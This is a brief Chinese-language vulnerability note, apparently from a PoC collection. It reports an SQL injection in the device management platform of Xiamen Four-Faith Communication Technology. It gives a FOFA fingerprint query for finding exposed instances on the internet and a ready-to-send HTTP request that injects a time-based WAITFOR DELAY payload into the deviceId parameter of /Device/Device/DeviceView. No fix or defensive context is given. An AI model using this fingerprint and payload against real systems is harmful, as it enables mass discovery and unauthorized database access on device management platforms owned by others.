## 厦门四信通信科技有限公司设备管理平台存在SQL注入


## fofa

```
body="/Content/images/textpwd.png"
```

## poc

```
GET /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```
